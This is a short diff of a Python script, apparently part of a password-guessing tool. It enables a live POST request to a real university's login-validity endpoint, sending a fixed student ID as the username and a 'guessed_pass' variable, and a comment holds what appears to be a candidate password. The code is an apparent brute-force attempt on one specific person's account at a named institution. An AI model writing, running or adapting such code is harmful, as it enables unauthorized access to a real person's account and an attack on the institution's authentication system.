@@ -42,6 +42,6 @@ URL = "http://biis.buet.ac.bd/BIIS_WEB/CheckValidity.do"
 
 PARAMS = {"userName": "15050586", "password": guessed_pass}
 # 27D46DeFN
-# sending get request and saving the response as response object
-# r = requests.post(url = URL, params = PARAMS)
-# print(r.text)
+#sending get request and saving the response as response object
+r = requests.post(url = URL, params = PARAMS)
+print(r.text)
